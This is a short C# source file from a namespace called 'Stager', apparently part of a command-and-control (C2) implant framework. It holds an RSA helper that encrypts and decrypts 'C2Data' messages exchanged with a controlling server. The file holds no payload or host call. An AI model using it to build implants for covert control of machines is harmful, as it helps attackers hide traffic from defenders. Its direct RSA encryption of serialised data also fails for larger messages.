using Shared.Models;
using Shared.Utilities;
using System.Security.Cryptography;

namespace Stager
{
    public class Crypto
    {
        public string PublicKey;
        string PrivateKey;

        string ServerKey;

        public Crypto()
        {
            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                PublicKey = rsa.ToXmlString(false);
                PrivateKey = rsa.ToXmlString(true);
            }
        }

        public void ImportServerKey(string ServerKey)
        {
            this.ServerKey = ServerKey;
        }

        public byte[] Encrypt(C2Data C2Data)
        {
            var data = Utilities.SerialiseData(C2Data);

            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                rsa.FromXmlString(ServerKey);
                return rsa.Encrypt(data, false);
            }
        }

        public C2Data Decrypt(byte[] Data)
        {
            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                rsa.FromXmlString(PrivateKey);
                var decrypted = rsa.Decrypt(Data, false);
                return Utilities.DeserialiseData<C2Data>(decrypted);
            }
        }
    }
}